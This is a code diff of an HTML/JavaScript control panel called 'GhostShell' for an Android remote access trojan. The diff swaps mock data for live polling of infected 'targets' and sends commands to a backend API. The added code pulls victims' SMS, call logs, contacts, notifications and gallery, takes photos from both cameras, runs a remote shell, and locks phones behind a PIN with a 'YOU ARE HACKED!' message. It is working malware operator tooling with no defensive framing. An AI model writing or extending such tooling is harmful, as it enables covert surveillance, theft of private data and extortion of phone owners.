@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>init::ghost [mobile]</title>
+    <title>GhostShell | live</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -13,7 +13,6 @@
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
-        /* dark system — black + red + green, mobile first */
         :root {
             --bg: #0b0303;
             --surface: #1a0e0e;
@@ -41,168 +40,8 @@
             background-image: radial-gradient(circle at 30% 20%, #2f130f 0%, #020000 100%);
         }
 
-        /* ---------- LOADER - MOBILE TUNED ---------- */
-        .system-loader {
-            position: fixed;
-            inset: 0;
-            background: #080000;
-            z-index: 10000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            transition: opacity 0.5s ease;
-            background: linear-gradient(145deg, #130404, #020101);
-            border: 2px solid #6a1f1f;
-        }
-
-        .system-loader.fade-out {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .boot-sequence {
-            width: 100%;
-            max-width: 400px;
-            background: #120808;
-            border: 2px solid #aa2b2b;
-            box-shadow: 0 0 40px #a83030;
-            padding: 24px 18px;
-            border-radius: 40px;
-            text-align: center;
-        }
-
-        .boot-logo {
-            width: 130px;
-            margin: 0 auto 15px;
-            filter: drop-shadow(0 0 20px #44ff88) drop-shadow(0 0 30px #ff3b3b);
-            animation: throb 2s infinite alternate;
-        }
-
-        .boot-logo img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .boot-text {
-            color: #f0ffd0;
-            font-size: 1.2rem;
-            letter-spacing: 3px;
-            font-weight: 300;
-            text-shadow: 0 0 8px #64ff9e, 0 0 12px #ff4f4f;
-            margin-bottom: 16px;
-        }
-
-        .boot-bar {
-            width: 100%;
-            height: 8px;
-            background: #2d1212;
-            border-radius: 20px;
-            border: 1px solid #aa3c3c;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-
-        .boot-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #ff3a3a, #6aff99, #ff3737);
-            box-shadow: 0 0 20px #5eff8c;
-            transition: width 2.5s cubic-bezier(0.1, 0.8, 0.3, 1);
-        }
-
-        .boot-status {
-            color: #9affb5;
-            font-family: monospace;
-            font-size: 0.9rem;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 5px;
-        }
-
-        /* target selector - compact for mobile */
-        .target-gate {
-            margin-top: 20px;
-            border-top: 2px dashed #962727;
-            padding-top: 16px;
-            display: none;
-        }
-
-        .target-gate.visible {
-            display: block;
-        }
-
-        .target-pill {
-            background: #201010;
-            border: 2px solid #3bc07b;
-            border-radius: 40px;
-            padding: 10px 14px;
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            cursor: pointer;
-            transition: 0.1s;
-            box-shadow: 0 3px 0 #471212;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .target-pill.selected {
-            border-color: #ff5e5e;
-            background: #3b1e1e;
-            box-shadow: 0 0 15px #ff5e5e, 0 3px 0 #5f1a1a;
-        }
-
-        .target-pill .icon {
-            font-size: 2rem;
-            min-width: 40px;
-            text-align: center;
-            color: #9affa8;
-        }
-
-        .target-pill .info h3 {
-            font-size: 1.2rem;
-            color: #ffa5a5;
-            line-height: 1.2;
-        }
-
-        .target-pill .info p {
-            font-size: 0.75rem;
-            color: var(--dim);
-        }
-
-        .enter-final {
-            background: transparent;
-            border: 3px solid #5eff99;
-            color: #caffd9;
-            padding: 12px 16px;
-            width: 100%;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            margin-top: 16px;
-            cursor: pointer;
-            transition: 0.1s;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .enter-final:disabled {
-            opacity: 0.2;
-            border-color: #713737;
-            pointer-events: none;
-        }
-
-        .enter-final:not(:disabled):active {
-            background: #a0ffb0;
-            color: black;
-            transform: scale(0.98);
-        }
-
-        /* ---------- MAIN DASHBOARD - MOBILE LAYOUT ---------- */
         #main-app {
-            display: none;
+            display: block;
             width: 100%;
             max-width: 480px;
             margin: 0 auto;
@@ -249,7 +88,6 @@
             margin-bottom: 12px;
         }
 
-        /* grid responsif untuk mobile */
         .grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -288,7 +126,6 @@
             box-shadow: 0 0 0 2px #fbffb0, 0 3px 0 #581c1c;
         }
 
-        /* device list di sidebar mobile (jadi horizontal scroll?) tapi kita buat vertikal biasa */
         #device-list {
             max-height: 200px;
             overflow-y: auto;
@@ -313,7 +150,6 @@
             box-shadow: 0 0 0 2px #ff8888;
         }
 
-        /* MODAL mobile + clean table styles for sms/calls/contacts */
         .modal {
             display: none;
             position: fixed;
@@ -361,7 +197,6 @@
             gap: 8px;
         }
 
-        /* clean table styling for data */
         .data-table {
             width: 100%;
             border-collapse: collapse;
@@ -373,25 +208,11 @@
             color: #ffa8a8;
             border-bottom: 2px solid #ba4a4a;
             padding: 8px 4px;
-            font-weight: 600;
         }
         .data-table td {
             padding: 8px 4px;
             border-bottom: 1px solid #5e3333;
             vertical-align: top;
-        }
-        .data-table tr:last-child td {
-            border-bottom: none;
-        }
-        .data-table td small {
-            color: #bd8f8f;
-            font-size: 0.7rem;
-        }
-        .msg-preview {
-            max-width: 200px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
         }
 
         .terminal {
@@ -444,43 +265,12 @@
         button:active { opacity: 0.8; }
         .red-btn { background: #ff2727; color: white; }
 
-        @keyframes throb {
-            0% { filter: drop-shadow(0 0 5px #ff3b3b) drop-shadow(0 0 15px #5eff99); }
-            100% { filter: drop-shadow(0 0 25px #ff6565) drop-shadow(0 0 35px #5eff99); }
-        }
-
-        /* landscape fixes */
         @media (min-width: 480px) {
             .grid { grid-template-columns: repeat(5, 1fr); }
         }
     </style>
 </head>
 <body>
-
-<!-- LOADER + TARGET GATE (mobile compact) -->
-<div id="systemLoader" class="system-loader">
-    <div class="boot-sequence">
-        <div class="boot-logo">
-            <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="ghost">
-        </div>
-        <div class="boot-text">SYSTEM INIT</div>
-        <div class="boot-bar">
-            <div class="boot-fill" id="bootFill" style="width: 0%;"></div>
-        </div>
-        <div class="boot-status">
-            <span id="bootMsg">loading kernel ...</span>
-            <span id="bootPercent">0%</span>
-        </div>
-
-        <div id="targetGate" class="target-gate">
-            <div style="color:#ff9f9f; font-size:1.3rem; margin-bottom:10px;"><i class="fa-regular fa-crosshairs"></i> SELECT TARGET</div>
-            <div id="loaderDeviceList"></div>
-            <button class="enter-final" id="enterDashboardBtn" disabled>▶ BOOT</button>
-        </div>
-    </div>
-</div>
-
-<!-- MAIN APP (mobile optimized) -->
 <div id="main-app">
     <div class="app-container">
         <header class="panel header">
@@ -506,7 +296,6 @@
     </div>
 </div>
 
-<!-- MODAL (mobile friendly) -->
 <div id="modal" class="modal">
     <div class="modal-card">
         <div class="modal-header">
@@ -520,272 +309,264 @@
 
 <script>
     (function() {
-        // BOOT SIMULATION
-        const bootFill = document.getElementById('bootFill');
-        const bootMsg = document.getElementById('bootMsg');
-        const bootPercent = document.getElementById('bootPercent');
-        const targetGate = document.getElementById('targetGate');
-        const loaderDeviceList = document.getElementById('loaderDeviceList');
-        const enterBtn = document.getElementById('enterDashboardBtn');
+        // ---------- AUTH CHECK ----------
+        const uid = localStorage.getItem('ghost_uid');
+        if (!uid) {
+            window.location.href = 'index.html';
+            return;
+        }
+        document.getElementById('user-display').innerText = uid;
+
+        // ---------- STATE (no dummy data) ----------
+        let devices = [];               // will be filled by poll
         let selectedDeviceId = null;
+        let flashState = false;
+        let curMod = null;
+        let termOutput = '';
+        let cache = {};                 // cache per device untuk data modal
 
-        const devices = [
-            { id: 'SM998B', model: 'SM-G998B', man: 'SAMSUNG', ver: '12', bat: '91', icon: 'fa-brands fa-android' },
-            { id: 'IP13P', model: 'iPhone 13 Pro', man: 'Apple', ver: '17', bat: '55', icon: 'fa-solid fa-mobile' },
-            { id: 'PXL7A', model: 'Pixel 7a', man: 'Google', ver: '14', bat: '22', icon: 'fa-brands fa-android' },
-            { id: 'ONEP10', model: 'OnePlus 10 Pro', man: 'OnePlus', ver: '13', bat: '78', icon: 'fa-solid fa-phone' }
-        ];
+        // UI elements
+        const deviceListEl = document.getElementById('device-list');
+        const selInfoEl = document.getElementById('sel-info');
+        const connStatEl = document.getElementById('conn-stat');
+        const mainGridEl = document.getElementById('main-grid');
 
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 3;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                bootMsg.innerText = '>> TARGET ACQUIRE <<';
-                targetGate.classList.add('visible');
+        // ---------- REAL-TIME DEVICE POLLING ----------
+        async function pollDevices() {
+            try {
+                const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
+                if (!res.ok) throw new Error('poll failed');
+                const data = await res.json();
+                // data.devices MUST be array of { id, model, man, ver, bat, ... }
+                devices = data.devices || [];
+                renderDeviceList();
+
+                // if selected device disappeared, reset
+                if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
+                    selectedDeviceId = null;
+                    updateSelection();
+                }
+            } catch (e) {
+                console.warn('poll error', e);
+                devices = [];
+                renderDeviceList();
             }
-            bootFill.style.width = progress + '%';
-            bootPercent.innerText = progress + '%';
-            if (progress < 30) bootMsg.innerText = 'loading kernel ...';
-            else if (progress < 70) bootMsg.innerText = 'init ghost core';
-            else bootMsg.innerText = 'spawning interface';
-        }, 80);
+            setTimeout(pollDevices, 3000);
+        }
 
-        function renderDevicePills() {
-            loaderDeviceList.innerHTML = devices.map(d => `
-                <div class="target-pill" data-id="${d.id}">
-                    <div class="icon"><i class="${d.icon}"></i></div>
-                    <div class="info">
-                        <h3>${d.model}</h3>
-                        <p>${d.man} · ${d.ver} · ⚡ ${d.bat}%</p>
-                    </div>
+        function renderDeviceList() {
+            if (!devices.length) {
+                deviceListEl.innerHTML = '<div style="color:#ff8888; padding:10px;">⛔ no targets online</div>';
+                return;
+            }
+            deviceListEl.innerHTML = devices.map(d => `
+                <div class="device-item ${selectedDeviceId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
+                    <b style="color:#ffb5b5">${d.model || 'unknown'}</b> (${d.man || '?'})<br>
+                    <small style="color:#a5d6b2">Android ${d.ver || '?'} | ⚡ ${d.bat || '?'}%</small>
                 </div>
             `).join('');
-
-            document.querySelectorAll('.target-pill').forEach(pill => {
-                pill.addEventListener('click', (e) => {
-                    document.querySelectorAll('.target-pill').forEach(p => p.classList.remove('selected'));
-                    pill.classList.add('selected');
-                    selectedDeviceId = pill.dataset.id;
-                    enterBtn.disabled = false;
-                });
-            });
         }
-        renderDevicePills();
 
-        // LOGOUT redirect to index.html
-        window.logout = function() {
+        window.selectDevice = (id) => {
+            selectedDeviceId = id;
+            renderDeviceList();
+            updateSelection();
+        };
+
+        function updateSelection() {
+            if (selectedDeviceId) {
+                selInfoEl.innerText = selectedDeviceId;
+                connStatEl.innerText = 'ONLINE';
+                connStatEl.style.color = '#9effb0';
+            } else {
+                selInfoEl.innerText = 'None';
+                connStatEl.innerText = 'OFF';
+                connStatEl.style.color = '#ff7a7a';
+            }
+            renderMainButtons();
+        }
+
+        // ---------- MAIN BUTTON GRID ----------
+        function renderMainButtons() {
+            const btns = [
+                { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
+                { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
+                { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
+                { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
+                { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
+                { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
+                { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
+                { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
+                { id:'open_url', i:'fa-globe', l:'URL' }
+            ];
+            mainGridEl.innerHTML = btns.map(b => 
+                `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
+            ).join('');
+        }
+
+        window.toggleFlashBtn = (btn) => {
+            flashState = !flashState;
+            btn.classList.toggle('active');
+            if (selectedDeviceId) cmd(flashState ? 'flashon' : 'flashoff');
+        };
+
+        // ---------- COMMAND SENDER ----------
+        window.cmd = function(command, extra = {}) {
+            if (!selectedDeviceId) return;
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cmd: command, client_id: selectedDeviceId, ...extra })
+            }).catch(e => console.warn('cmd error', e));
+        };
+
+        // ---------- MODAL HANDLER (real data) ----------
+        window.openModal = (t) => {
+            if (!selectedDeviceId) return;
+            curMod = t;
+            document.getElementById('modal').style.display = 'flex';
+            document.getElementById('modal-title').innerText = t.toUpperCase();
+            const body = document.getElementById('modal-body');
+            const foot = document.getElementById('modal-footer');
+            body.innerHTML = ''; foot.innerHTML = '';
+
+            if (t === 'filemanager') {
+                termOutput = 'ghost@android:~#\n';
+                body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
+                    <div style="display:flex; gap:5px; margin-top:8px;">
+                        <span style="color:#ffa4a4">λ</span>
+                        <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
+                    </div>`;
+                foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
+                cmd('filemanager');
+            }
+            else if (t === 'panic') {
+                body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
+                foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
+            }
+            else if (t === 'voice') {
+                body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
+                foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
+            }
+            else if (t === 'toast') {
+                body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
+                foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
+                                  <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
+            }
+            else if (t === 'vibrate') {
+                body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
+                foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
+            }
+            else if (t === 'setwallpaper') {
+                body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
+                foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
+            }
+            else if (t === 'open_url') {
+                body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
+                foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
+            }
+            else {
+                // All data modules: show loading then send command
+                body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
+                foot.innerHTML = `<button onclick="cmd('${mapCmd(t)}')">REFRESH</button>`;
+                cmd(mapCmd(t));
+            }
+
+            function mapCmd(modalType) {
+                const map = {
+                    sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
+                    notifications: 'getnotifications', info: 'deviceinfo',
+                    gallery: 'gallery', apps: 'list_app',
+                    takebackpic: 'takebackpic', takefrontpic: 'takefrontpic'
+                };
+                return map[modalType] || modalType;
+            }
+        };
+
+        // ---------- UPDATE MODAL WITH REAL DATA ----------
+        window.updateModalData = function(type, data) {
+            if (curMod !== type) return;
+            const body = document.getElementById('modal-body');
+            if (!body) return;
+
+            if (type === 'sms') {
+                body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
+                    (data || []).map(s => `<tr><td>${s.userSender || '?'}</td><td>${s.content || ''}</td></tr>`).join('')
+                }</table>`;
+            }
+            else if (type === 'calls') {
+                body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
+                    (data || []).map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
+                }</table>`;
+            }
+            else if (type === 'contacts') {
+                body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
+                    (data || []).map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
+                }</table>`;
+            }
+            else if (type === 'notifications') {
+                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
+                    (data || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')
+                }</table>`;
+            }
+            else if (type === 'info') {
+                const i = data || {};
+                body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
+            }
+            else if (type === 'gallery') {
+                if (data && data.files) {
+                    body.innerHTML = `<div class="gal-grid">${
+                        data.files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
+                    }</div>`;
+                } else {
+                    body.innerHTML = '<p>no images</p>';
+                }
+            }
+            else if (type === 'apps') {
+                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
+                    (data || []).map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
+                }</table>`;
+            }
+            else if (type === 'filemanager') {
+                // handled separately via terminal
+            }
+        };
+
+        // ---------- UTILS ----------
+        window.execShellCmd = () => {
+            let inp = document.getElementById('term-in');
+            if (!inp) return;
+            const cmdLine = inp.value;
+            termOutput += `\n# ${cmdLine}`;
+            document.getElementById('terminal').innerText = termOutput;
+            cmd(cmdLine);
+            inp.value = '';
+        };
+
+        window.closeModal = () => {
+            document.getElementById('modal').style.display = 'none';
+            if (curMod === 'filemanager') cmd('exit_shell');
+            if (curMod === 'gallery') cmd('exit_gallery');
+            curMod = null;
+        };
+
+        window.logout = () => {
+            localStorage.removeItem('ghost_uid');
             window.location.href = 'index.html';
         };
 
-        enterBtn.addEventListener('click', () => {
-            if (!selectedDeviceId) return;
-            document.getElementById('systemLoader').classList.add('fade-out');
-            setTimeout(() => {
-                document.getElementById('systemLoader').style.display = 'none';
-                document.getElementById('main-app').style.display = 'block';
-                initMain(selectedDeviceId);
-            }, 400);
-        });
+        // mock functions (can be replaced with real implementations)
+        window.startMockRec = window.startMockRec || function() {};
+        window.stopMockRec = window.stopMockRec || function() {};
+        window.uploadWall = window.uploadWall || function() {};
 
-        // MAIN DASHBOARD
-        let curMod = null;
-        let flashState = false;
-        let selId = null;
-        let termOutput = '';
+        // start polling
+        updateSelection();
+        pollDevices();
 
-        // mock data generator untuk tampilan rapih
-        function generateMockSms() {
-            return [
-                { sender: '+62 812-3456-7890', content: 'Hey, we need to talk about the project deadline.', date: '10:34' },
-                { sender: 'Unknown', content: 'Your package has been shipped. Track here: https://bit.ly/3x...', date: 'Yesterday' },
-                { sender: 'Google', content: 'Your verification code is 284756', date: 'Yesterday' },
-                { sender: 'Telegram', content: 'New login from Chrome on Windows', date: '2 days ago' }
-            ];
-        }
-        function generateMockCalls() {
-            return [
-                { number: '+62 811-222-3333', duration: '125s', type: 'incoming' },
-                { number: '+62 877-888-9999', duration: '0s (missed)', type: 'missed' },
-                { number: '+62 813-444-5555', duration: '320s', type: 'outgoing' },
-                { number: '+62 856-777-8888', duration: '64s', type: 'incoming' }
-            ];
-        }
-        function generateMockContacts() {
-            return [
-                { name: 'Michael', number: '+62 811-111-1111' },
-                { name: 'Sarah Chen', number: '+62 822-222-2222' },
-                { name: 'Alex', number: '+62 833-333-3333' },
-                { name: 'Mom', number: '+62 844-444-4444' }
-            ];
-        }
-        function generateMockNotifications() {
-            return [
-                { app: 'WhatsApp', title: 'Sarah', text: 'See you later!' },
-                { app: 'Gmail', title: 'Password reset', text: 'Click here to reset your password...' },
-                { app: 'Instagram', title: 'New follower', text: 'john_doe started following you' }
-            ];
-        }
-
-        function initMain(firstId) {
-            selId = firstId;
-            document.getElementById('user-display').innerText = 'visitor';
-            window.selectDevice = (id) => { selId = id; refreshDeviceList(); updateMainUi(); };
-
-            function refreshDeviceList() {
-                const container = document.getElementById('device-list');
-                container.innerHTML = devices.map(d => `
-                    <div class="device-item ${selId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
-                        <b style="color:#ffb5b5">${d.model}</b> (${d.man})<br>
-                        <small style="color:#a5d6b2">Android ${d.ver} | ⚡ ${d.bat}%</small>
-                    </div>
-                `).join('');
-            }
-
-            function updateMainUi() {
-                document.getElementById('sel-info').innerText = selId || 'None';
-                const online = !!selId;
-                document.getElementById('conn-stat').innerText = online ? 'ONLINE' : 'OFFLINE';
-                document.getElementById('conn-stat').style.color = online ? '#9effb0' : '#ff7a7a';
-                renderMainButtons();
-            }
-
-            function renderMainButtons() {
-                const btns = [
-                    { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
-                    { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
-                    { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
-                    { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
-                    { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
-                    { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
-                    { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
-                    { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
-                    { id:'open_url', i:'fa-globe', l:'URL' }
-                ];
-                document.getElementById('main-grid').innerHTML = btns.map(b => 
-                    `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
-                ).join('');
-            }
-
-            window.toggleFlashBtn = (btn) => {
-                flashState = !flashState;
-                btn.classList.toggle('active');
-            };
-
-            window.openModal = (t) => {
-                if (!selId) return;
-                curMod = t;
-                document.getElementById('modal').style.display = 'flex';
-                document.getElementById('modal-title').innerText = t.toUpperCase();
-                const body = document.getElementById('modal-body');
-                const foot = document.getElementById('modal-footer');
-                body.innerHTML = ''; foot.innerHTML = '';
-
-                if (t === 'filemanager') {
-                    termOutput = 'ghost@android:~#\n';
-                    body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
-                        <div style="display:flex; gap:5px; margin-top:8px;">
-                            <span style="color:#ffa4a4">λ</span>
-                            <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
-                        </div>`;
-                    foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
-                }
-                else if (t === 'panic') {
-                    body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
-                    foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
-                }
-                else if (t === 'voice') {
-                    body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
-                    foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
-                }
-                else if (t === 'toast') {
-                    body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
-                    foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
-                                      <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
-                }
-                else if (t === 'vibrate') {
-                    body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
-                    foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
-                }
-                else if (t === 'setwallpaper') {
-                    body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
-                    foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
-                }
-                else if (t === 'open_url') {
-                    body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
-                    foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
-                }
-                else if (t === 'sms') {
-                    const smsData = generateMockSms();
-                    body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
-                        smsData.map(s => `<tr><td><small>${s.sender}<br>${s.date}</small></td><td class="msg-preview">${s.content}</td></tr>`).join('')
-                    }</table>`;
-                    foot.innerHTML = `<button onclick="cmd('getsms')">REFRESH</button>`;
-                }
-                else if (t === 'calls') {
-                    const callsData = generateMockCalls();
-                    body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
-                        callsData.map(c => `<tr><td>${c.number} <small>(${c.type})</small></td><td>${c.duration}</td></tr>`).join('')
-                    }</table>`;
-                    foot.innerHTML = `<button onclick="cmd('getcalllogs')">REFRESH</button>`;
-                }
-                else if (t === 'contacts') {
-                    const contactsData = generateMockContacts();
-                    body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
-                        contactsData.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')
-                    }</table>`;
-                    foot.innerHTML = `<button onclick="cmd('getcontacts')">REFRESH</button>`;
-                }
-                else if (t === 'notifications') {
-                    const notifData = generateMockNotifications();
-                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Content</th></tr>${
-                        notifData.map(n => `<tr><td>${n.app}</td><td><b>${n.title}</b>: ${n.text}</td></tr>`).join('')
-                    }</table>`;
-                    foot.innerHTML = `<button onclick="cmd('getnotifications')">REFRESH</button>`;
-                }
-                else if (t === 'info') {
-                    body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>SM-G998B</td></tr><tr><td>Manufacturer</td><td>Samsung</td></tr><tr><td>Android</td><td>12</td></tr><tr><td>Battery</td><td>91%</td></tr><tr><td>Phone</td><td>+62 812-3456-7890</td></tr></table>`;
-                }
-                else {
-                    body.innerHTML = `<p style="color:#ffc0c0; padding:20px;">[${t}] module ready</p>`;
-                    if (t === 'gallery') {
-                        body.innerHTML = `<div class="gal-grid">${Array(6).fill(0).map(()=>'<div class="gal-item"><img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" style="background:#2c1515;"></div>').join('')}</div>`;
-                        foot.innerHTML = `<button>PREV</button><span style="color:#ffa8a8">PAGE 1</span><button>NEXT</button>`;
-                    }
-                }
-            };
-
-            window.cmd = function(c) { console.log('CMD:', c); };
-            window.startMockRec = () => {
-                document.getElementById('v-stat').innerText = '🔴 REC';
-                document.querySelector('button[onclick="startMockRec()"]').style.display='none';
-                document.getElementById('v-stop').style.display='inline-block';
-            };
-            window.stopMockRec = () => {
-                document.getElementById('v-stat').innerText = 'stopped';
-                document.getElementById('v-stop').style.display='none';
-                document.querySelector('button[onclick="startMockRec()"]').style.display='inline-block';
-            };
-            window.uploadWall = (input) => { console.log('upload', input.files[0]); };
-            window.execShellCmd = () => {
-                let inp = document.getElementById('term-in');
-                if (!inp) return;
-                termOutput += `\n# ${inp.value}`;
-                document.getElementById('terminal').innerText = termOutput;
-                inp.value = '';
-            };
-            window.closeModal = () => { document.getElementById('modal').style.display = 'none'; curMod = null; };
-
-            refreshDeviceList();
-            updateMainUi();
-        }
+        // expose for server push (optional)
+        window.receiveModalData = window.updateModalData;
     })();
-
-    // fallback global functions
-    window.closeModal = window.closeModal || function() { document.getElementById('modal').style.display = 'none'; };
